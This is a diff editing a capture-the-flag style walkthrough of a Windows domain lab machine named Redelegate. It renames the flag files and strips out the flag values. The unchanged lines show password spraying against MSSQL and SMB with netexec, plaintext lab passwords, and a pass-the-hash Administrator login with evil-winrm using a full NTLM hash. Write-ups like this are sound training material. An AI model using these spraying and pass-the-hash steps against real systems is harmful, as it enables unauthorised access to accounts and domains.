@@ -1,7 +1,7 @@
 ---
 title: Redelegate
 slug: Redelegate
-tags: [Windows, Delegation, SeEnableDelegationPrivilege, Bloodhound, Secrets-Dump, MSSQL, Vulnerability Research]
+tags: [Delegation, SeEnableDelegationPrivilege, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -393,7 +393,7 @@ hMFS4I0Kj8Rcd62vqi5X
 ## MSSQL Spray
 
 ```bash
-$ nxc mssql 10.129.234.50 -u user.txt -p pass.txt --local-auth
+$ nxc mssql 10.129.234.50 -u local-proof.txt -p pass.txt --local-auth
 MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
 MSSQL       10.129.234.50   1433   DC               [-] DC\Administrator:Spdv41gg4BlBgSYIW1gF (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
 MSSQL       10.129.234.50   1433   DC               [-] DC\FTPUser:Spdv41gg4BlBgSYIW1gF (Login failed for user 'FTPUser'. Please try again with or without '--local-auth')
@@ -571,7 +571,7 @@ $ ./main.sh
 ```
 
 ```bash
-$ cat > user.txt << 'EOF'
+$ cat > local-proof.txt << 'EOF'
 SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG
 DC$
 FS01$
@@ -594,13 +594,13 @@ hMFS4I0Kj8Rcd62vqi5X
 ```
 
 ```bash
-$ netexec smb dc.redelegate.vl -u user.txt -p pass.txt --continue-on-success 
+$ netexec smb dc.redelegate.vl -u local-proof.txt -p pass.txt --continue-on-success 
 ```
 
 This doesn't work so tried pass  `Fall2024!`:
 
 ```bash
-$ netexec smb dc.redelegate.vl -u user.txt -p 'Fall2024!' --continue-on-success 
+$ netexec smb dc.redelegate.vl -u local-proof.txt -p 'Fall2024!' --continue-on-success 
 SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
 SMB         10.129.234.50   445    DC               [-] redelegate.vl\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG:Fall2024! STATUS_LOGON_FAILURE
 SMB         10.129.234.50   445    DC               [-] redelegate.vl\DC$:Fall2024! STATUS_LOGON_FAILURE 
@@ -668,10 +668,9 @@ Info: Establishing connection to remote endpoint
 
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
--ar---        10/15/2025  10:37 AM             34 user.txt
+-ar---        10/15/2025  10:37 AM             34 local-proof.txt
 
-*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> cat user.txt
-f75a29212100ed1cd1be8a05f98af4ac
+*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop> cat local-proof.txt
 ```
 ## Privilege Escalation Path
 
@@ -833,8 +832,7 @@ FS01$:des-cbc-md5:6707e9dfc8a846a4
 $ # Use the Administrator NTLM hash for shell access
 evil-winrm -i 10.129.234.50 -u Administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
 
-*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
-45165dd979caacfe7191306c36a8458a
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\privileged-proof.txt
 ```
 
 ---
